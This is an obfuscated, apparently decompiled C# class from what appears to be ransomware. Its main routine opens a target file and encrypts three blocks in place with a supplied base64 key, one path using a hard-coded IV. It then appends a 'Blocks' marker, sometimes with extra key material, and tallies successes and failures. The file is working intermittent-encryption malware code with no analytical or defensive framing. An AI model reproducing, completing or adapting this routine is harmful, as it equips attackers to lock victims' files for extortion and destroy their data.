using System;
using System.IO;
using System.Text;
using NS001;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class GeksFIyCuYbq
{
	[NonSerialized]
	internal static GetString f000053;

	public static int zfvsLOKxDdoz(long p0)
	{
		return (int)p0;
	}

	public static bool uVsAlcvYzOr(string sWwzrmNOHrjr, string p1, string RzLPPlGazddiOk, byte[] btlcMmBbizmbR = null, byte[] p4 = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(sWwzrmNOHrjr, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = zfvsLOKxDdoz(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(p1) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(p1) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(p1) * 1024 * 1024) / 10;
				}
				int cNqbpbzcNfoE = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] p5 = m00002c(sWwzrmNOHrjr, fileStream, cNqbpbzcNfoE, num * i);
					array = (GhAMvbuoccW.uBIPmjbCjNt ? sAdFSOOagDt.m00002a(p5, Convert.FromBase64String(RzLPPlGazddiOk), p4) : c000018.SvtZMRYDytMixf(p5, Convert.FromBase64String(RzLPPlGazddiOk), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					m00002d(sWwzrmNOHrjr, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes("Blocks" + "+" + Convert.ToString(p1) + "+") : Encoding.ASCII.GetBytes("Blocks" + "-" + Convert.ToString(p1) + "-"));
			if (!GhAMvbuoccW.PAOJgADrbjEa)
			{
				using FileStream fileStream2 = new FileStream(sWwzrmNOHrjr, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream2 = new FileStream(sWwzrmNOHrjr, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(btlcMmBbizmbR, 0, btlcMmBbizmbR.Length);
				fileStream2.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (GhAMvbuoccW.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(GhAMvbuoccW.f000025, "File: " + sWwzrmNOHrjr + " - Error creating filestream for block process or read-write: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			GhAMvbuoccW.f00002a++;
			return false;
		}
		GhAMvbuoccW.f00002b++;
		return true;
	}

	public static byte[] m00002c(string p0, FileStream nIgpxCOkjaTzOR, int cNqbpbzcNfoE, int oumwHMpqaKokqf = 0)
	{
		byte[] array = new byte[cNqbpbzcNfoE];
		nIgpxCOkjaTzOR.Position = oumwHMpqaKokqf;
		nIgpxCOkjaTzOR.Read(array, 0, cNqbpbzcNfoE);
		return array;
	}

	public static void m00002d(string ubHsHEvjIWVrU, FileStream p1, byte[] NfSloiNLiflBY, int SVkQcfzuIqzlj = 0)
	{
		p1.Position = SVkQcfzuIqzlj;
		p1.Write(NfSloiNLiflBY, 0, NfSloiNLiflBY.Length);
	}

	static GeksFIyCuYbq()
	{
		Strings.CreateGetStringDelegate(typeof(GeksFIyCuYbq));
	}
}
